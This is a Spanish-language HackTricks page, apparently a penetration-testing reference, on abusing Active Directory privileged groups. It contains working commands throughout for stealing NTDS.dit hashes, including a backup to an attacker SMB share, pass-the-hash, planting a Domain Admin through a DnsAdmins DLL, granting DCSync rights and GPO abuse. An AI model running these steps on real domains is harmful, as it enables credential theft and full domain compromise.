# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos conocidos con privilegios de administración

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tiene permisos para crear cuentas y grupos que no son administradores en el dominio. Además, permite el inicio de sesión local en el Domain Controller (DC).

Para identificar los miembros de este grupo, se ejecuta el siguiente comando:
```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Se permite agregar nuevos usuarios, así como iniciar sesión localmente en el DC.<sup>[[1]](#references)</sup>

## grupo AdminSDHolder

La Access Control List (ACL) del grupo **AdminSDHolder** es crucial, ya que establece los permisos para todos los "grupos protegidos" dentro de Active Directory, incluidos los grupos con altos privilegios. Este mecanismo garantiza la seguridad de estos grupos al impedir modificaciones no autorizadas.

Un atacante podría aprovechar esto modificando la ACL del grupo **AdminSDHolder** y otorgando permisos completos a un usuario estándar. Esto le daría efectivamente a ese usuario control total sobre todos los grupos protegidos. Si los permisos de este usuario se modifican o eliminan, se restablecerían automáticamente en el plazo de una hora debido al diseño del sistema.<sup>[[14]](#references)</sup>

La documentación reciente de Windows Server todavía trata varios grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins`, etc.). El proceso **SDProp** se ejecuta en el **PDC Emulator** cada 60 minutos de forma predeterminada, establece `adminCount=1` y deshabilita la herencia en los objetos protegidos. Esto resulta útil tanto para la persistencia como para detectar usuarios privilegiados obsoletos que fueron eliminados de un grupo protegido, pero que todavía conservan la ACL sin herencia.<sup>[[12]](#references)</sup>

Los comandos para revisar los miembros y modificar los permisos incluyen:
```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
Select-Object distinguishedName
```
Hay un script disponible para agilizar el proceso de restauración: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para obtener más detalles, visita [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

La pertenencia a este grupo permite leer objetos eliminados de Active Directory, lo que puede revelar información confidencial:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
Esto resulta útil para **recuperar rutas de privilegios anteriores**. Los objetos eliminados aún pueden exponer `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antiguos o el DN de un grupo privilegiado eliminado que posteriormente otro operador puede restaurar.
```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
-Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```
### Acceso al Domain Controller

El acceso a los archivos del DC está restringido, a menos que el usuario forme parte del grupo `Server Operators`, lo que cambia el nivel de acceso.

### Privilege Escalation

Usando `PsService` o `sc` de Sysinternals, se pueden inspeccionar y modificar los permisos de los servicios. El grupo `Server Operators`, por ejemplo, tiene control total sobre ciertos servicios, lo que permite ejecutar comandos arbitrarios y realizar una escalada de privilegios:<sup>[[1]](#references)</sup>
```cmd
C:\> .\PsService.exe security AppReadiness
```
Este comando revela que `Server Operators` tiene acceso completo, lo que permite manipular servicios para obtener privilegios elevados.

## Backup Operators

La pertenencia al grupo `Backup Operators` proporciona acceso al sistema de archivos de `DC01` gracias a los privilegios `SeBackup` y `SeRestore`. Estos privilegios permiten recorrer carpetas, enumerarlas y copiar archivos, incluso sin permisos explícitos, mediante el indicador `FILE_FLAG_BACKUP_SEMANTICS`. Para este proceso es necesario utilizar scripts específicos.<sup>[[1]](#references)</sup>

Para enumerar los miembros del grupo, ejecuta:
```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Ataque local

Para aprovechar estos privilegios localmente, se emplean los siguientes pasos:

1. Importar las bibliotecas necesarias:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Habilita y verifica `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Acceder y copiar archivos desde directorios restringidos, por ejemplo:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Attack

El acceso directo al sistema de archivos del Domain Controller permite robar la base de datos `NTDS.dit`, que contiene todos los hashes NTLM de los usuarios y equipos del dominio.

#### Uso de diskshadow.exe

1. Crea una shadow copy de la unidad `C`:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Copia `NTDS.dit` desde la shadow copy:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Como alternativa, usa `robocopy` para copiar archivos:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrae `SYSTEM` y `SAM` para recuperar hashes:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Recuperar todos los hashes de `NTDS.dit`:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
5. Post-extracción: Pass-the-Hash a DA<sup>[[11]](#references)</sup>
```bash
# Use the recovered Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```
#### Uso de wbadmin.exe

1. Configure el sistema de archivos NTFS para el servidor SMB en la máquina atacante y almacene en caché las credenciales SMB en la máquina objetivo.
2. Use `wbadmin.exe` para realizar una copia de seguridad del sistema y extraer `NTDS.dit`:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Para ver una demostración práctica, consulta el [VIDEO DE DEMOSTRACIÓN CON IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Los miembros del grupo **DnsAdmins** pueden explotar sus privilegios para cargar una DLL arbitraria con privilegios de SYSTEM en un servidor DNS, normalmente alojado en Domain Controllers. Esta capacidad permite un potencial de explotación considerable.

Para enumerar los miembros del grupo DnsAdmins, usa:
```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Ejecutar una DLL arbitraria (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidad permite ejecutar código arbitrario con privilegios de SYSTEM en el servicio DNS (normalmente dentro de los DC). Este problema se solucionó en 2021.

Los miembros pueden hacer que el servidor DNS cargue una DLL arbitraria (ya sea localmente o desde un recurso compartido remoto) mediante comandos como:
```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Es necesario reiniciar el servicio DNS (lo que puede requerir permisos adicionales) para que se cargue la DLL:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Para obtener más detalles sobre este vector de ataque, consulta ired.team.

#### Mimilib.dll

También es posible usar mimilib.dll para ejecutar comandos, modificándolo para que ejecute comandos específicos o reverse shells. [Consulta esta publicación](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para obtener más información.<sup>[[15]](#references)</sup>

### Registro WPAD para MitM

Los DnsAdmins pueden manipular registros DNS para realizar ataques Man-in-the-Middle (MitM) mediante la creación de un registro WPAD después de deshabilitar la lista global de bloqueo de consultas. Se pueden usar herramientas como Responder o Inveigh para realizar spoofing y capturar tráfico de red.

### Event Log Readers
Los miembros pueden acceder a los registros de eventos y potencialmente encontrar información confidencial, como contraseñas en texto plano o detalles sobre la ejecución de comandos:
```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Permisos de Windows de Exchange

Este grupo puede modificar las DACL del objeto de dominio, lo que podría permitir otorgar privilegios de DCSync. Las técnicas de escalada de privilegios que explotan este grupo se detallan en el repositorio de GitHub Exchange-AD-Privesc.
```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
Si puedes actuar como miembro de este grupo, el abuso clásico consiste en conceder a una principal controlada por el atacante los derechos de replicación necesarios para [DCSync](dcsync.md):
```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```
Históricamente, **PrivExchange** encadenaba el acceso a buzones, la autenticación forzada de Exchange y LDAP relay para obtener este mismo primitivo. Incluso cuando esa ruta de relay está mitigada, la pertenencia directa a `Exchange Windows Permissions` o el control de un servidor Exchange sigue siendo una ruta de alto valor hacia los derechos de replicación del dominio.

## Hyper-V Administrators

Hyper-V Administrators tienen acceso completo a Hyper-V, lo que puede explotarse para obtener el control de Domain Controllers virtualizados. Esto incluye clonar DCs activos y extraer hashes NTLM del archivo NTDS.dit.

### Ejemplo de explotación

El abuso práctico suele consistir en el **acceso offline a discos o checkpoints de DCs**, en lugar de antiguas técnicas de LPE a nivel del host. Con acceso al host de Hyper-V, un operador puede crear un checkpoint o exportar un Domain Controller virtualizado, montar el VHDX y extraer `NTDS.dit`, `SYSTEM` y otros secretos sin tocar LSASS dentro del guest:
```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```
Desde allí, reutiliza el workflow de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` y los registry hives sin conexión.

## Group Policy Creators Owners

Este grupo permite a sus miembros crear Group Policies en el dominio. Sin embargo, sus miembros no pueden aplicar group policies a usuarios o grupos, ni editar GPOs existentes.

El matiz importante es que el **creator se convierte en el owner de la nueva GPO** y normalmente obtiene suficientes permisos para editarla posteriormente. Esto significa que este grupo resulta interesante cuando puedes:

- crear una GPO maliciosa y convencer a un administrador para vincularla a una OU o dominio objetivo
- editar una GPO que hayas creado y que ya esté vinculada en algún lugar útil
- abusar de otro permiso delegado que te permita vincular GPOs, mientras este grupo te proporciona la capacidad de edición

En la práctica, el abuso normalmente consiste en añadir una **Immediate Task**, un **startup script**, membresía de **local admin** o un cambio de **user rights assignment** mediante archivos de policy respaldados por SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>
```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```
Si editas la GPO manualmente a través de `SYSVOL`, recuerda que el cambio no es suficiente por sí solo: también deben actualizarse `versionNumber`, `GPT.ini` y, en ocasiones, `gPCMachineExtensionNames`; de lo contrario, los clientes ignorarán la actualización de la policy.<sup>[[9]](#references)</sup>

## Organization Management

En entornos donde está desplegado **Microsoft Exchange**, un grupo especial conocido como **Organization Management** posee capacidades importantes. Este grupo tiene privilegios para **acceder a los buzones de todos los usuarios del dominio** y mantiene **control total sobre** la Unidad Organizativa (OU) **'Microsoft Exchange Security Groups'**. Este control incluye el grupo **`Exchange Windows Permissions`**, que puede explotarse para realizar una escalada de privilegios.

### Explotación de privilegios y comandos

#### Print Operators

Los miembros del grupo **Print Operators** cuentan con varios privilegios, incluido **`SeLoadDriverPrivilege`**, que les permite **iniciar sesión localmente en un Domain Controller**, apagarlo y administrar impresoras. Para explotar estos privilegios, especialmente si **`SeLoadDriverPrivilege`** no es visible en un contexto sin elevación, es necesario realizar un bypass de User Account Control (UAC).<sup>[[1]](#references)</sup>

Para listar los miembros de este grupo, se utiliza el siguiente comando de PowerShell:
```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
En los Domain Controllers, este grupo es peligroso porque la política predeterminada de los Domain Controllers otorga **`SeLoadDriverPrivilege`** a `Print Operators`. Si obtienes un token elevado para un miembro de este grupo, puedes habilitar el privilegio y cargar un driver firmado pero vulnerable para saltar al kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Para consultar los detalles sobre el manejo de tokens, revisa [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Los miembros de este grupo obtienen acceso a los PCs mediante el Remote Desktop Protocol (RDP). Para enumerar estos miembros, hay comandos de PowerShell disponibles:
```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Se pueden encontrar más detalles sobre la explotación de RDP en recursos de pentesting específicos.

#### Usuarios de administración remota

Los miembros pueden acceder a los equipos mediante **Windows Remote Management (WinRM)**. La enumeración de estos miembros se logra mediante:
```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Para las técnicas de explotación relacionadas con **WinRM**, se debe consultar documentación específica.

#### Server Operators

Este grupo tiene permisos para realizar diversas configuraciones en Domain Controllers, incluidos los privilegios de backup y restore, cambiar la hora del sistema y apagarlo.<sup>[[1]](#references)</sup> Para enumerar los miembros, se proporciona el siguiente comando:
```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
En los Domain Controllers, `Server Operators` normalmente heredan suficientes derechos para **reconfigurar o iniciar/detener servicios** y también reciben `SeBackupPrivilege`/`SeRestorePrivilege` mediante la directiva predeterminada de los DC. En la práctica, esto los convierte en un puente entre el **abuso del control de servicios** y la **extracción de NTDS**:
```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```
Si una ACL de servicio concede a este grupo permisos para cambiarlo/iniciarlo, apunta el servicio a un comando arbitrario, inícialo como `LocalSystem` y luego restaura el `binPath` original. Si el control de servicios está restringido, recurre a las técnicas de `Backup Operators` anteriores para copiar `NTDS.dit`.

## References

- [1] [ired.team – Cuentas privilegiadas y privilegios de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Abuso de SeLoadDriverPrivilege para la escalada de privilegios](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Abuso de permisos de GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso de GPO, parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Guía de un Red Teamer sobre GPO y OU](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Función ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anónimo → Password Spray → SeBackupPrivilege → Domain Admin](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Apéndice C: Cuentas y grupos protegidos en Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Cómo abusar de AdminSDHolder y crearle una puerta trasera para obtener persistencia como Domain Admin](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Abuso del privilegio DnsAdmins para la escalada en Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Información sobre el abuso de la relación GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Función NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
{{#include ../../banners/hacktricks-training.md}}
